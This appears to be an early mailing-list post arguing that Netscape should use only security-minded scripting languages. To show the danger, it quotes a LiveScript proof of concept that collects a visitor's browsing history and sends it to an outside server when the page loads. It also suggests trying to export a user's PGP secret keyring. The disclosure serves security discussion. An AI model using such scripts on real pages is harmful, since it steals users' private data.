	About a month ago, I made the argument that Java, despite its
imperfections, is much better than most things we'll see.  I stand by
this argument, and urge Netscape to use only Java* as a scripting
language.

	*By Java, I mean the class of languages designed with security
in mind.  I think that means Java and Safe-TCL.  Taint-perl is not
useful; its designed for unsafe input from a user, not unsafe code.

	People with time to hack netscape might experiment with
location.href = "file://.pgp/secring.pgp" and see if you can write a
script to export it somewhere.

And here's how its done.  Hitting the page makes your history public
knowledge.  (Btw, Bal, is Netbsd1.1 stable yet? :)

scott@tripleg.com.au wrote this code:

<SCRIPT LANGUAGE="LiveScript">

<!--
  i = 0
  yourHistory = ""
  while (i < history.length) { 
    yourHistory += history[i]
    i++;
    if (i < history.length) yourHistory += "^"
  }
  location.href = "http://www.tripleg.com.au/cgi-bin/scott/his?"+yourHistory
<!-- hahah here is the hidden script -->
